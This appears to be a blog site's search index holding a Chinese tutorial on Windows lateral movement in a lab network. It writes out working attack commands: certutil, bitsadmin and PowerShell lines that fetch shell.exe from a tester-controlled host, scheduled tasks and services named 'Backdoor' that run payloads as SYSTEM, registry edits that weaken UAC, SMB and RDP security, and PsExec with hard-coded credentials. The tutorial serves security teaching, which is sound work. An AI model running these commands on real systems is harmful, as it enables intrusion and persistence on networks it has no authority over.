<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>红日靶场一</title>
      <link href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/"/>
      <url>/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动</title>
      <link href="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h1><p>横向移动（<strong>Lateral Movement</strong>）是从一个受感染主机迁移到另一个受感染主机的过程。一旦进入内部网络，测试人员就会将已被攻陷的机器作为跳板，继续访问或控制内网中的其他机器，直至获取机密数据或控制关键资产。通过横行移动，测试人员最终可能获取域控制器的权限并接管整个域环境。</p><p>横向移动包括用来进入内部网络和控制网络上的远程系统的技术。通常，测试人员需要借助内网代理来探测内网中存活的资产，并确定最终的攻击目标。然后通过收集到的用户凭据，利用各种远程控制技术对目标发起攻击。<br>本章所有关于横向移动的攻击技术都以图5-0-1所示的网络拓扑进行测试。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231031205646974.png" class title="image-20231031205646974"><p><strong>Kali Linux</strong>为测试人员的主机，其对测试人员是可控的，也被称为“可控主机”或“可控服务器”。<br><strong>Initial Victim</strong>为测试人员最初攻陷的机器，也被称为“跳板机“所控主机”或“当前所控主机”。<br>内网中的其他三台机器分别是本次实践的横向移动目标，需要从<strong>Initial Victim</strong>迁移到这三台目标机器。它们也被称为“远程主机”或“内网其他主机”。</p><h2 id="横向移动中的文件传输"><a href="#横向移动中的文件传输" class="headerlink" title="横向移动中的文件传输"></a>横向移动中的文件传输</h2><p>攻击时往往需要预先制订文件传输方案，以便在后续操作过程中向攻击目标部署攻击载荷或其他文件。</p><h3 id="通过网络共享-IPC"><a href="#通过网络共享-IPC" class="headerlink" title="通过网络共享($IPC)"></a>通过网络共享($IPC)</h3><p><strong>Windows</strong>系统中的网络共享功能可以实现局域网之间的文件共享。通过提供有效的用户凭据，用户可以很轻松地将文件从一台机器传输到另一台机器。<br>执行<code>net share</code>命令，获得<strong>Windows</strong>系统默认开启的网络共享，其中<code>C$</code>为C盘共享，<code>ADMINS$</code>为系统目录共享，还有一个是<code>IPC$</code>共享。<strong>IPC（Internet Process Connection）</strong><br>是共享“命名管道”的资源，为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。<br>利用当前所控主机与内网中的其他远程主机建立的网络共享连接，测试人员可以访问远程主机上的资源，如直接查看远程主机目录、在两台主机之间复制文件、读取远程主机上的文件等。而实战中往往会建立<code>IPC$</code>连接。因为通过<code>PC$</code>连接，不仅可以进行所有文件共享操作，还可以实现其他远程管理操作，如列出远程主机进程、在远程主机上创建计划任务或系统服务等，这在进行内网横向移动中起着至关重要的作用。<br>建立<code>IPC$</code>连接需要具备以下两个条件：</p><ol><li>远程主机开启了<strong>IPC</strong>连接</li><li>远程主机的<strong>139</strong>端口和<strong>445</strong>端口开放。</li></ol><p>执行以下命令，与远程主机建立<strong>IPC</strong>连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.111.137\IPC$ &quot;Admin@123&quot; /user:&quot;administrator&quot;</span><br><span class="line"># net use \\&lt;IP/Hostname&gt;\IPC$ &lt;Password&gt; /user:&lt;Username&gt;</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231031211608821.png" alt="image-20231031211608821" style="zoom: 50%;"><p>此时，执行以下命令，可以成功列出远程主机的C盘共享目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.111.163\C$</span><br></pre></td></tr></table></figure><p>使用<strong>copy</strong>命令，可以通过共享连接向远程主机上复制文件，也可以将远程主机上的文件复制到本地，但需要注意当前用户对远程目录的权限。例如，将一个二进制程序复制到远程主机的C盘目录中。实战中可以将攻击载荷上传到远程主机，然后通过其他远程执行的方法来运行，如创建远程计划任务或服务等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy .\reverse_tcp.exe \\192.168.111.137\C$</span><br></pre></td></tr></table></figure><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231031212422033.png" alt="image-20231031212422033" style="zoom:50%;">建立其他共享连接的命令与**IPC$<strong>连接的命令相同，需要指定远程主机的IP或主机名、盘符、用户名和密码。例如，连接远程主机的</strong>C$**共享：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.111.137\C$ &quot;Admin@123&quot; /user:&quot;Administrator&quot;</span><br></pre></td></tr></table></figure><h3 id="搭建SMB服务器"><a href="#搭建SMB服务器" class="headerlink" title="搭建SMB服务器"></a>搭建SMB服务器</h3><p><strong>SMB</strong>（<strong>Server Message Block</strong>，服务器消息块），又称<strong>CIFS</strong>（<strong>Common Internet File System</strong>，网络文件共享系统），由微软开发，基于应用层网络传输协议，主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通新等资源。<strong>SMB</strong>消息一般使用<strong>NetBIOS</strong>协议或<strong>TCP</strong>发送，分别使用端口<strong>139</strong>或<strong>445</strong>，目前倾向于使用<strong>445</strong>端口。</p><p>实战中可以在测试人员自己的服务器或当前所控内网主机上搭建<strong>SMB</strong>服务器，将需要横向传输的文件如攻击载荷等放入<strong>SMB</strong>服务器的共享目录，并指定<strong>UNC</strong>路径，让横向移动的目标主机远程加载<strong>SMB</strong>共享的文件。注意，需使用<strong>SMB</strong>匿名共享，并且搭建的<strong>SMB</strong>服务器能够被横向移动的目标所访问到。</p><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>在<strong>Linux</strong>系统上，可以通过<strong>Impacket</strong>项目提供的<strong>smbserver.py</strong>来搭建<strong>SMB</strong>服务器。<br>执行以下命令，即可在搭建一个名为<strong>evilsmb</strong>，共享目录指向<code>/root/share</code>的<strong>SMB</strong>匿名共享。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/share</span><br><span class="line">python smbserver.py evilsmb /root/share -smb2support</span><br></pre></td></tr></table></figure><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><h5 id="通过界面开启可匿名访问的文件共享服务器"><a href="#通过界面开启可匿名访问的文件共享服务器" class="headerlink" title="通过界面开启可匿名访问的文件共享服务器"></a>通过界面开启可匿名访问的文件共享服务器</h5><p>具体方法如下：</p><ol><li><p>启用Guest用户</p><p>运行<code>gpedit.msc</code>，打开组策略</p><p>位置：<code>Computer Configuration</code>-&gt;<code>Windows Settings</code>-&gt;<code>Security Settings</code>-&gt;<code>Local Policies</code>-&gt;<code>Security Options</code></p><p>选择策略<code>Accounts: Guest account status</code>，设置为<code>Enabled</code></p></li><li><p>将Everyone权限应用于匿名用户</p><p>位置：<code>Computer Configuration</code>-&gt;<code>Windows Settings</code>-&gt;<code>Security Settings</code>-&gt;<code>Local Policies</code>-&gt;<code>Security Options</code></p><p>选择策略<code>Network access:Let Everyone permissions apply to anonymous users</code>，设置为<code>Enabled</code></p></li><li><p>指定匿名共享文件的位置</p><p>位置：<code>Computer Configuration</code>-&gt;<code>Windows Settings</code>-&gt;<code>Security Settings</code>-&gt;<code>Local Policies</code>-&gt;<code>Security Options</code></p><p>选择策略<code>Network access:Shares that can be accessed anonymously</code>，设置名称，这里可以填入<code>smb</code></p></li><li><p>将Guest用户从策略“拒绝从网络访问这台计算机”中移除</p><p>位置：<code>Computer Configuration</code>-&gt;<code>Windows Settings</code>-&gt;<code>Security Settings</code>-&gt;<code>Local Policies</code>-&gt;<code>User Rights Assignment</code></p><p>选择策略<code>Deny access to this computer from the network</code>，移除用户Guest</p></li><li><p>设置文件共享</p><p>选择要共享的文件夹，设置高级共享，共享名为<code>smb</code>，共享权限组或用户名为<code>Everyone</code></p><p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为<code>//&lt;ip&gt;/smb</code></p></li></ol><h5 id="使用命令行开启共享"><a href="#使用命令行开启共享" class="headerlink" title="使用命令行开启共享"></a><strong>使用命令行开启共享</strong></h5><ol><li><p>启用<strong>Guest</strong>用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user guest /active:yes</span><br></pre></td></tr></table></figure></li><li><p>将<strong>Everyone</strong>权限应用于匿名用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></li><li><p>指定匿名共享文件的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot; /v NullSessionShares /t REG_MULTI_SZ /d smb /f</span><br></pre></td></tr></table></figure></li><li><p>将<strong>Guest</strong>用户从策略“拒绝从网络访问这台计算机”中移除</p><p>导出组策略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secedit /export /cfg gp.inf /quiet</span><br></pre></td></tr></table></figure><p>修改文件<code>gp.inf</code>，将<code>SeDenyNetworkLogonRight = Guest</code>修改为<code>SeDenyNetworkLogonRight =</code>，保存</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231106205656508.png" alt="image-20231106205656508" style="zoom:50%;"><p>重新导入组策略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secedit /configure /db gp.sdb /cfg gp.inf /quiet</span><br></pre></td></tr></table></figure><p>强制刷新组策略，立即生效(否则，重启后生效)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate/force</span><br></pre></td></tr></table></figure></li><li><p>设置文件共享</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\share\ /T /grant Everyone:r</span><br><span class="line">net share share=c:\share /grant:everyone,full</span><br></pre></td></tr></table></figure></li></ol><p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为<code>//&lt;ip&gt;/smb</code></p><h5 id="脚本一键开启"><a href="#脚本一键开启" class="headerlink" title="脚本一键开启"></a><strong>脚本一键开启</strong></h5><p><a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Enable  #开启</span><br><span class="line">Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Disable  #关闭</span><br></pre></td></tr></table></figure><h3 id="通过Windows自带工具"><a href="#通过Windows自带工具" class="headerlink" title="通过Windows自带工具"></a>通过Windows自带工具</h3><h5 id="1-Certutil"><a href="#1-Certutil" class="headerlink" title="1.Certutil"></a>1.Certutil</h5><p><strong>certutil</strong>是<strong>Windows</strong>自带的命令行工具，用于管理<strong>Windows</strong>证书并作为证书服务的一部分安装。<strong>Certutil</strong>提供了从网络中下载文件的功能，测试人员可以在远程主机上执行<strong>Certutil</strong>命令，控制其下载预先部署在可控服务器上的恶意文件，如攻击载荷等。<br>执行以下命今：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://IP:Port/shell.exe C:\reverse_tcp.exe</span><br></pre></td></tr></table></figure><p> 通过<strong>Certutil</strong>下载<strong>shell.exe</strong>，并将其保存到<strong>C:\reverse_tcp.exe</strong></p><h5 id="2-BITSAdmin"><a href="#2-BITSAdmin" class="headerlink" title="2.BITSAdmin"></a>2.BITSAdmin</h5><p><strong>Bitsadmin</strong>是一个<strong>Windows</strong>命令行工具，可以用于创建、下载或上载作业，监视其进度。<strong>Windows7</strong>及以后版本的系统自带<strong>Bitsadmin</strong>工具。执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer test http://IP:Port/shell.exe C:\reverse_tcp.exe</span><br></pre></td></tr></table></figure><p>创建一个名为<strong>text</strong>的<strong>Bitsadmin</strong>任务，下载<strong>shell.exe</strong>到本地，并将其保存到<code>C:\reverse_tcp.exe</code></p><h5 id="3-Powershell"><a href="#3-Powershell" class="headerlink" title="3.Powershell"></a>3.Powershell</h5><p>参考<strong>PowerShell</strong>远程加载执行的思路，可以通过创建<strong>WebClient</strong>对象来实现文件下载。执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(New-Object Net.WebClient).DownloadFile(&#x27;http://IP:Port/shell.exe&#x27;,&#x27;C:\reverse_tcp.exe&#x27;)</span><br></pre></td></tr></table></figure><p>下载<strong>shell.exe</strong>到本地并保存到<code>C:\reverse_tcp.exe</code></p><h2 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h2><h3 id="常规利用流程"><a href="#常规利用流程" class="headerlink" title="常规利用流程"></a>常规利用流程</h3><p>通过已有的PC连接，在远程主机上创建计划任务，让目标主机在规定的时间点或周期内执行特定操作。在拥有对方管理员凭据的条件下，可以通过计划任务实现横向移动，具体操作流程如下。</p><ol><li>利用已建立的共享连接向远程主机（<strong>10.10.10.19</strong>）上传攻击载荷。</li><li>利用已建立的<strong>IPC</strong>连接或指定用户凭据的方式在远程主机上创建计划任务。执行以下命令：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F</span><br><span class="line"># /S，指定要连接到的系统;  /TN，指定要创建的计划任务的名称;  /SC，指定计划任务执行频率</span><br><span class="line"># /M0，指定计划任务执行周期;  /TR，指定计划任务运行的程序路径;  /RU，指定计划任务运行的用户权限</span><br><span class="line"># /F，如果指定的任务已经存在，则强制创建</span><br></pre></td></tr></table></figure><p>在远程主机上创建一个计划任务，每分钟执行一次上传的攻击载荷。</p><p>如果没有建立<strong>IPC</strong>连接，就需要手动指定远程主机的用户凭据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F /U Administrator /P Admin@123</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 192.168.111.136 /TN Backdoor /SC minute /MO 1 /TR C:\Users\bob\Desktop\hack.exe /RU System /F /U Administrator /P 1qaz@WSX</span><br></pre></td></tr></table></figure><h3 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h3><p><strong>Windows</strong>系统中使用<strong>UNC</strong>路径来访问网络共享资源，格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\servername\sharename\directory\filename</span><br></pre></td></tr></table></figure><p>其中，<strong>servername</strong>是服务器主机名，<strong>sharename</strong>是网络共享的名称，<strong>directory</strong>和<strong>filename</strong>分别为该共享下的目录和文件。<br>在远程主机上攻击载荷时，可以直接使用<strong>UNC</strong>路径代替常规的本地路径，让远程主机直接在测试人员搭建的<strong>SMB</strong>共享中加载攻击载荷并执行。这样可以省去手动上传攻击载荷的步骤。这里以计划任务为例进行演示，其他类似创建服务、<strong>PsExec</strong>、<strong>WMI</strong>、<strong>DCOM</strong>等远程执行方法都适用。</p><ol><li>测试人员在一台可控的服务器上搭建<strong>SMB</strong>匿名共享服务，并将生成的攻击载荷放入共享目录。</li><li>执行以下命令在靶机上生成攻击载荷并执行。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 192.168.111.135 /TN Backdoor /SC minute /MO 1 /TR \\192.168.111.136\smb\hack.exe /RU System  /F /U Administrator /P 1qaz@WSX</span><br></pre></td></tr></table></figure><h2 id="利用系统服务"><a href="#利用系统服务" class="headerlink" title="利用系统服务"></a>利用系统服务</h2><h3 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h3><p>除了创建计划任务，测试人员还可以通过在远程主机上创建系统服务的方式，在远程主机上运行指定的程序或命令。该方式需要拥有两端主机的管理员权限和**IPC$**连接，具体操作如下。</p><ul><li><p>利用已建立的共享连接向远程主机（<strong>192.168.111.135</strong>）上传攻击载荷。</p></li><li><p>利用已建立的<strong>IPC</strong>连接在远程主机上创建系统服务。执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.111.135 create Backdoor binpath= &quot;cmd.exe /k C:\reverse_tcp.exe&quot;</span><br><span class="line"># binpath,指定服务启动时运行的二进制文件，注意&quot;=&quot;后需要有一个空格</span><br></pre></td></tr></table></figure></li></ul><p>在远程主机上创建一个名为<strong>Backdoor</strong>的系统服务，服务启动时将执行上传的攻击载荷</p><ul><li><p>执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.111.135 start Backcdoor</span><br></pre></td></tr></table></figure></li><li><p>攻击结束后，将创建的服务删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.111.135 delete Backdoor</span><br></pre></td></tr></table></figure></li></ul><h3 id="SCShell"><a href="#SCShell" class="headerlink" title="SCShell"></a>SCShell</h3><p><strong>SCShell</strong>是一款利用系统服务的无文件横向移动工具。与传统的创建远程服务的方法不同，<strong>SCShell</strong>利用提供的用户凭据，通过<strong>ChangeServiceConfigA API</strong>修改远程主机上的服务配置，将服务的二进制路径名修改为指定的程序或攻击载荷，然后重启服务。执行结束后，服务二进制路径将恢复为原始路径。<br><strong>SCShell</strong>需要提供远程主机的管理员权限用户的凭据，并且需要已知远程主机上的系统服务名称。方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCShell.exe 10.10.10.19 XblAuthManager &quot;C:\Windows\System32\cmd.exe /c calc&quot; hack-my.com Administrator Admin@123</span><br><span class="line"># SCShell.exe  &lt;Target&gt; &lt;Service Name&gt; &lt;Payload&gt; &lt;Domain&gt; &lt;Username&gt; &lt;Password&gt; </span><br></pre></td></tr></table></figure><p>下面通过<strong>Regsvr32</strong>执行外部SCT文件的方式上线远程主机</p><ol><li>通过<strong>MetaSploit</strong>启动一个<strong>Web Delivery</strong>，并生成用于<strong>Regsvr32</strong></li></ol><h3 id="UAC-Remote-Restrictions"><a href="#UAC-Remote-Restrictions" class="headerlink" title="UAC Remote Restrictions"></a>UAC Remote Restrictions</h3><p><strong>UAC</strong>（用户账户控制）使计算机用户能够以非管理员身份执行日常任务。本地管理员组中任何非<strong>RID 500</strong>的其他管理员用户也将使用最小权限原则运行大多数应用程序，具有类似标准用户的权限。当执行需要管理员权限的任务时，<strong>Windows</strong>会自动提示用户予以批准。<br>为了更好地保护属于本地管理员组成员的用户，微软在<strong>Windows Vista</strong>以后的操作系统中引入了<strong>UAC Remote Restrictions</strong>（远程限制）。此机制有助于防止本地恶意软件以管理权限远程运行。因此，如果测试人员使用计算机本地用户进行需要管理员权限的远程管理操作，无论是<strong>schtasks</strong>还是后面要讲到的<strong>PsExec</strong>、<strong>WMI</strong>、<strong>WinRM</strong>、哈希传递攻击，都只能使用<strong>RID500</strong>（<strong>Administrator</strong>）的本地管理员用户，使用其他任何用户包括非<strong>RID 500</strong>的本地管理员用户都会提示“拒绝访问”。<br>注意，<strong>UAC Remote Restrictions</strong>只限制本地用户，域管理员用户不受限制，因此会在很大程度上限制工作组环境中的横向移动。有条件的可以通过执行以下命令并重启系统来关闭<strong>UAC Remote Restrictions</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><h2 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h2><p>远程桌面协议（<strong>Remote Desktop Protocol，RDP</strong>）是微软从<strong>Windows Server 2000</strong>开始提供的功能，用户可以通过该功能登录并管理远程主机，所有操作就像在自己的计算机上操作一样。远程桌面协议默认监听<strong>TCP3389</strong>端口。</p><p>利用远程桌面进行横向移动是常见的方法。当内网中的其他主机开启了远程桌面服务后，测试人员可以通过已获取的用户凭据，借助内网代理等技术进行远程登录，通过远程桌面服务对目标主机进行实时操作。但是这种方法可能将已登录的用户强制退出，容易被管理员发现。</p><h3 id="远程桌面的确定和开启"><a href="#远程桌面的确定和开启" class="headerlink" title="远程桌面的确定和开启"></a>远程桌面的确定和开启</h3><p>执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br></pre></td></tr></table></figure><p>通过查询注册表来确定当前主机是否开启了远程桌面功能。若字段值为0（即图中的0x0），则说明<strong>RDP</strong>服务以启动，若为1，则说明<strong>RDP</strong>服务已禁用。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231109221525101.png" alt="image-20231109221525101" style="zoom: 67%;"><p>执行以下命令，可在本地开启远程桌面功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#开启远程桌面连接功能</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">#关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权） </span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\winstations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0</span><br><span class="line"></span><br><span class="line">#设置防火墙策略放行3389端口</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><p>对于远程主机，可以通过<strong>WMI</strong>来开启远程桌面功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /Node:192.168.111.135 /User:Administrator /Password:1qaz@WSX RDTOGGLE WHERE ServerName=&#x27;JOHN&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><p>需要指定远程主机的IP、主机名和用户凭据</p><h3 id="RDP-Hijacking"><a href="#RDP-Hijacking" class="headerlink" title="RDP Hijacking"></a>RDP Hijacking</h3><p>对于开启远程桌面服务的<strong>Windows</strong>计算机，当多个用户进行登录时，会产生多个会话。渗透测试人员可以通过已获取的<strong>SYSTEM</strong>权限劫持其他用户的<strong>RDP</strong>会话，并在未授权的情况下成功登入目标系统，即使该用户的会话已断开。这种攻击方法被称为**<code>RDP Hijacking</code><strong>（</strong>远程桌面劫持**），于2017年由以色列安全研究员Alexander Korznikov在个人博客中披露。</p><p>远程桌面劫持需要获取系统<strong>SYSTEM</strong>权限并执行<strong>tscon</strong>命令。该命令提供了一个切换用户会话的功能。在正常情况下，切换会话时需要提供目标用户的登录密码，但在<strong>SYSTEM</strong>权限下能够完全绕过验证，不输入密码即可切换到目标用户的会话，从而实现未授权登录。读者可以自行阅读相关文章，以了解更多细节。<br>例如，测试人员获取到了某台主机的普通用户权限，并以该用户成功登录远程桌面，然后执行<code>query user</code>命令，发现该主机上还存在其他用户的会话记录。其中，<strong>Marcus</strong>和<strong>Administrator</strong>用户的会话已断开，<strong>Vincent</strong>用户的会话为活跃状态。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231126135558486.png" alt="image-20231126135558486" style="zoom:130%;"><p>此时，如果可以通过提权方法获取系统<strong>SYSTEM</strong>权限，就可以在不提供其他用户登录凭据的情况下劫持用户的<strong>RDP</strong>会话。在<strong>Meterpreter</strong>中提权至<strong>SYSTEM</strong>权限后，执行以下命令，<strong>rdesktop</strong>成功切换到<strong>Administrator</strong>用户的桌面。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231126135625403.png" alt="image-20231126135625403" style="zoom:150%;"><h3 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h3><p><strong>SharpRDP</strong>是一款开源工具，可以通过远程桌面协议在远程主机上执行系统命令，且不需<strong>GUI</strong>客户端。该工具需要远程主机开启远程桌面功能，并且防火墙放行<strong>3389</strong>端口。<br>通常在内网渗透时，如果想登录一台内网主机的远程桌面，需要先搭建内网代理，然后使用<strong>RDP</strong>客户端进行连接。但是，测试人员可以直接将<strong>SharpRDP</strong>上传到跳板机，然后获取到的用户凭据，对内网其他主机执行系统命令。这样就省去了内网代理等中间环节。了解更多关于<strong>SharpRDP</strong>工具的细节，请阅读相关文章。</p><h2 id="PsExec远程控制"><a href="#PsExec远程控制" class="headerlink" title="PsExec远程控制"></a>PsExec远程控制</h2><p><strong>PsExec</strong>是微软官方提供的一款实用的<strong>Windows</strong>远程控制工具，可以根据凭据在远程系统上执行管理操作，并且可以获得与命令行几乎相同的实时交互性。<strong>PsExec</strong>最强大的功能之一就是可以在远程系统中启动交互式命令提示窗口，以便实时显示有关远程系统的信息。<br><strong>PsExec</strong>原理是通过<strong>SMB</strong>连接到服务端的<code>Admin$</code>共享，并释放名为<strong>psexesvc.exe</strong>的二进制文件，然后注册名为<strong>PSEXESVC</strong>服务。当客户端执行命令时，服务端通过<strong>PSEXESVC</strong>服务启动相应的程序执行命令并回显数据。运行结束后，<strong>PSEXESVC</strong>服务会被删除用<strong>PsExec</strong>进行远程操作需要具备以下条件：</p><ol><li>远程主机开启了<code>Admin$</code>共享</li><li>远程主机未开启防火墙或放行<strong>445</strong>端口。执行以下命令：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula \\10.10.10.19 -u HACK-MY\Administrator -p Admin@123 -s cmd.exe</span><br><span class="line"># -accepteula，禁止弹出许可证对话框；-u，指定远程主机的用户名；-p，指定用户的密码</span><br><span class="line"># -s，以SYSTEM权限启动进程，如果未指定该参数，就将以管理员权限启动进程</span><br></pre></td></tr></table></figure><p>用域管理员用户的凭据连接远程主机（<strong>10.10.10.19</strong>），并以<strong>SYSTEM</strong>权限启动一个交互式命令行</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231126170234479.png" alt="image-20231126170234479" style="zoom:80%;"><p>在内网渗透中，如果已有相应凭据，那么可以直接使用<strong>PsExec</strong>连接远程主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula \\192.168.54.136 